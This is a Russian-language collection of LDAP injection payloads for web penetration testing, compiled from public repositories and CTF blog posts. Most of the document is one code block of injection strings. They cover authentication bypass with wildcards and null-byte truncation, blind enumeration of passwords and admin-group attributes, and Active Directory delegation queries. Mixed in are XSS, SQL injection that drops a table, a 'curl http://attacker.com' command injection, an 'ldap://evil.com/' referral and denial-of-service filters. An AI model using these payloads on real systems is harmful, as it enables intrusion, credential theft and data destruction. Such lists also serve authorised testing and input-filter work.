## Список полезных нагрузок LDAP:

## Источники:
- InfoSecWarrior:  
  https://github.com/InfoSecWarrior/Offensive-Pentesting-Web/tree/main/Injections/LDAP-Injection  
  (Ресурсы по пентесту веб-приложений с примерами LDAP-инъекций)

- PayLoadAllTheThings:  
  https://github.com/Ne3o1/PayLoadAllTheThings/tree/master/LDAP%20injection  
  (Коллекция полезных нагрузок для эксплуатации уязвимостей LDAP)

- LDAP_payload:  
  https://www.freebuf.com/vuls/356049.html  
  https://exp-blog.com/safe/ctf/rootme/web-server/ldap-injection-authentication/  
  https://blog.csdn.net/qq_45290991/article/details/113713261  
  https://blog.csdn.net/luoshu88/article/details/132149278  
  https://rce.moe/2022/01/25/ldap-inject-1/  
  (Технические статьи и руководства по эксплуатации LDAP-инъекций в различных сценариях)

## Список LDAP-полезных нагрузок:
(Примеры эксплуатации уязвимостей LDAP-инъекций)
```
*
*)(&
*))%00
 )(cn=))\x00
 *()|%26'
 *()|&'
 *(|(mail=*))
 *(|(objectclass=*))
 *)(uid=*))(|(uid=*
 */*
 *|
 /
 //
 //*
 @*
 |
 admin*
 admin*)((|userpassword=*)
 admin*)((|userPassword=*)
 x' or name()='username' or 'x'='y
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
*/*
*|
/
//
//*
@*
|
admin*
admin*)((|userpassword=*)
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y
!
%21
%26
%28
%29
%2A%28%7C%28mail%3D%2A%29%29
%2A%28%7C%28objectclass%3D%2A%29%29
%2A%7C
%7C
&
(
)
=
username=*)(objectClass=*
(&(user=*)(objectClass=*))(password=...)
(&(USER= slisberger)(&))(PASSWORD=Pwd))
(&(parameter1=value1)(parameter2=value2))
(&(USER=Uname)(PASSWORD=Pwd)) 
(&(USER= *)(&))(PASSWORD=Pwd))
(&(directory=document)(security_level=low))
document)(security_level=*))(&(directory=documents
(&(directory=documents)(security_level=*))(&(direcroty=documents)(security_level=low))
(&(directory=documents)(security_level=*))
(&(direcroty=documents)(security_level=low))
(|(parameter1=value1)(parameter2=value2))
(|(type=Rsc1)(type=Rsc2))
(|(type=printer)(uid=*))(type=scanner)
(&(objectClass=printer)(type=Epson*))
*)(objectClass=*))(&(objectClass=void
(&(objectClass=*)(objectClass=*))(&(objectClass=void)(type=Epson*))
(&(objectClass=*)(objectClass=*))
(&(objectClass=*)(objectClass=users))(&(objectClass=foo)(type=Epson*))
(&(objectClass=*)(objectClass=resources))(&(objectClass=foo)(type=Epson*))
(|(objectClass=void)(objectClass=void))(&(objectClass=void)(type=Epson*))
(|(objectClass=void)(objectClass=users))(&(objectClass=void)(type=Epson*))
(|(objectClass=void)(objectClass=resources))(&(objectClass=void)(type=Epson*))
(&(idprinter=value1)(objectclass=printer))
(&(idprinter=HPLaserJet2100)(ipaddresss=*))(objectclass=printer)
(&(idprinter=HPLaserJet2100)(departments=*))(objectclass=printer)
(&(idprinter=HPLaserJet2100)(department=a*))(object=printer))
(&(idprinter=HPLaserJet2100)(department=f*))(object=printer))
(&(idprinter=HPLaserJet2100)(department=fa*))(object=printer))
(&(idprinter=HPLaserJet2100)(department=*b*))(object=printer))
(&(idprinter=HPLaserJet2100)(department=*n*))(object=printer))
(&(uid=admin)(|(uid=admin)(userPassword=exp)))
(&(uid=root)(|(uid=root)(userPassword=exp)))
(&(uid=administrator)(|(uid=administrator)(userPassword=exp)))
(&(uid=*)(|(uid=*)(userPassword=exp)))
(&(uid=admin)(&))(userPassword=exp))
(&(uid=root)(&))(userPassword=exp))
(&(uid=administrator)(&))(userPassword=exp))
(&(uid=root)(&))%00)(userPassword=exp))
(&(uid=administrator)(&))%00)(userPassword=exp))
(&(uid=admin)(&))%00)(userPassword=exp))
(&(uid=admin)(uid=admin)) (&(1=0)(userPassword=exp))
(&(uid=administrator)(uid=administrator)) (&(1=0)(userPassword=exp))
(&(uid=root)(uid=root)) (&(1=0)(userPassword=exp))
name = hacker)
name = hacker)(cn=)
name = hacker)(cn=))
name = hacker)(cn=))%00
(&(cn=hacker)(cn=));
a*)(cn=))%00password=123
a)(cn=*))%00password=123
(cn=[INPUT])
|: (|(cn=[INPUT1])(cn=[INPUT2]))
&: (&(cn=[INPUT1])(userPassword=[INPUT2]))
*hacker))%00&password=123
a*))%00&password=123
admin)(&))
(&(username=admin)(&))(password=123))
Rsc1=printer)(uid=*)
(|(type=printer)(uid=*))(type=scanner))
(&(name=hacker))%00)(passwd=hacker))
(&(name=h*))%00)(passwd=xxx))
(&(name=hacker))
(name=*)
(&(name=*)(gender=girl))
(!name=zhangsan)
(name=zhang*)
(&(attribute=value)(injected_filter)) (second_filter)
(&(username=uname)(password=pwd))
(&(username=admin)(&))(password=*))
(cn=admin)
(|(cn=admin)(mail=admin)(mobile=admin))
(cn=a*)
(cn=ad*)
(cn=adm*)
(cn=admi*)
(cn=admin*)
(cn=a*n)
(cn=*n)
(cn=*)
(cn=admin)(mobile=13*)
(cn=admin)(userPassword=a*)
(attribute=value)(injected\_filter)
(|(attribute=value)(second_filter)) or (&(attribute=value)(second_filter))
(&(attribute=value)(injected_filter)) (second_filter)。
(&(attribute=value)(injected_filter))(&(1=0)(second_filter))
(&(attribute=value)(injected_filter)(second_filter))
(&(objectClass=*)(mobile=123)(uid=*))(password=123))
(&(objectClass=*)(mobile=%s*)(password=123))
username=*)(uid=*))(&(1=0
password=anything
(&(uid=username)(password=password))
(&(uid=*)(uid=*))(&(1=0)(password=anything))
search=*)(objectClass=*))(&(objectClass=void
(&(objectClass=user)(cn=search))
(&(objectClass=user)(cn=*)(objectClass=*))(&(objectClass=void)(cn=search))
group=*)(adminRole=TRUE
(&(objectClass=group)(member=user))
(&(objectClass=group)(member=*)(adminRole=TRUE))
search=*)(|(cn=*)(cn=*)(cn=*...
username=admin)(|(department=IT)(department=Finance
)(&)
(&(user=)(&)(password=xxx))
(&(user={input})(password=xxx))
*)(objectClass=*))(|(objectClass=xxx
admin)(|(password=*
*))(|(cn=*
*)(uid=*
*)(|(uid=*
*)(!(!uid=*
admin)(&(uid=admin)(|(1=1
*)(department=*)(|(objectClass=*
*)(userPassword=*
*)(objectClass=*
*)(mail=*
*)(telephoneNumber=*
*)(memberOf=*
*)(description=*
*)(uidNumber=*
*)(gidNumber=*
*)(homeDirectory=*
*)(loginShell=*
*)(pwdAccountLockedTime=*
*)(isAdmin=TRUE
*)(memberOf=CN=Admins,DC=example,DC=com
*)(userAccountControl=512
*)(sudoRole=*
*)(acl=*
*)(invalidAttribute=*
*)(|(cn=)(
*)(objectClass=))
*)(|(objectClass=#
*)(|(cn=\00
*)(department=IT)(|(department=*
*)(createdTimestamp>=20230101000000Z
*)(uid=admin)(|(uid=*
*)(mail=*@example.com)(|(mail=*
*)(objectClass=inetOrgPerson)(|(objectClass=*
*))(&(uid=*)(|(uid=*
*)(|(objectClass=user)(objectClass=group))
*)(&(uid=*)(!(userPassword=*))
*)(|(cn=Admin*)(cn=Super*))
*)(&(objectClass=*)(!(description=*))
*)(cn=*\\2A*
*)(ou=*_test
*)(sn=Smith?)
*)(mail=*%25example.com
*)(displayName=*<img src=x onerror=alert(1)>
*)(givenName=J*
*)(mail=*admin*
*)(telephoneNumber=+1*
*)(uid=*test*
*)(objectClass=*Person*
*)(|(cn=*
admin)(|(userPassword=*
*)(!(userPassword=*))
*)(&(uid=*)(objectClass=*))
*)(uid=*)(objectClass=*
*)(|(objectClass=*)(objectClass=foo
*)(|(cn=admin)(cn=root)
*)(department=IT)(uid=*
*)(userAccountControl=66048
*)(pwdLastSet=0
*)(authPassword=*
*)(shadowLastChange=*
*)(accountExpires=*
*)(msDS-AllowedToDelegateTo=*
*)(userPrincipalName=*
*)(sAMAccountName=*
*)(gidNumber>=1000)
*)(mailLocalAddress=*
*)(sshPublicKey=*
*)(krbLastPwdChange=*
*)(memberOf=CN=Domain Admins,CN=Users,DC=example,DC=com
*)(msDS-KeyCredentialLink=*
*)(sudoUser=ALL
*)(msDS-AllowedToActOnBehalfOfOtherIdentity=*
*)(aclEntry=*
*)(msDS-HostServiceAccount=*
*)(nsRole=*
*)(privilege=*
*)(msDS-SecondaryKrbTgtNumber=*
*)(pamAccountFlag=ADMIN
*)(|(cn=%61dmin
*)(telephoneNumber=1234567_
*)(displayName=*Smi\74h
*)(mail=*@ex%61mple.com
*)(sn=*Bj?rn
*))(|(uid=*)(&(uid=*
*)(&(objectClass=user)(|(department=IT)(department=Finance)))
*)(|(&(uid=admin)(objectClass=*))(cn=*))
*)(!(|(objectClass=group)(objectClass=organizationalUnit)))
*)(&(mail=*@example.com)(!(userPassword=*)))
*)(|(sn=Smith)(givenName=John))(&(uid=*
*)(&(objectClass=*)(|(uid=*)(cn=*)))
*)(|(objectClass=top)(objectClass=*))
*)(&(telephoneNumber=+1*)(!(description=*test*))
*)(|(uid=admin*)(uid=root*))
*)(|(cn=admin)(delay=5000)
*)(createdTimestamp>=20230101)(|(cn=*
*)(modifyTimestamp<=20231231)(|(cn=*
*)(|(employeeNumber=*)(sleep=3)
*)(|(objectClass=inetOrgPerson)(objectClass=invalid))
*)(objectClass=shadowAccount)
*)(objectClass=posixGroup)
*)(objectClass=organizationalRole)
*)(objectClass=applicationProcess)
*)(objectClass=certificationAuthority)
*)(ipServicePort=*
*)(gecos=*
*)(loginDisabled=TRUE)
*)(x500UniqueIdentifier=*
*)(labeledURI=*
*)(mail=*'; DROP TABLE users;--
*)(description=*|curl http://attacker.com*
*)(jpegPhoto=*%FF%FE%00%00
*)(audio=*<svg/onload=alert(1)>
*)(seeAlso=ldap://evil.com/
*)(|(cn=*)(cn=*)(cn=*)(cn=*...
*)(&(objectClass=*)(objectClass=*)(objectClass=*...
*)(|(cn=AAAAAAAAAAAAAAAAAAAA...
*)(|(cn=*)(!(cn=*))(cn=*)(!(cn=*))...
*)(|(objectClass=*)(objectClass=*)(objectClass=*...
*)(uid=*admin*
*)(mail=*@example*.com
*)(sn=*son)
*)(givenName=J???
*)(department=Sales*
*)(cn=*\\2A
*)(ou=Dept%20A)
*)(description=*<script>*
*)(uid=*'))%00
*)(|(cn=*)(!(cn=*
```
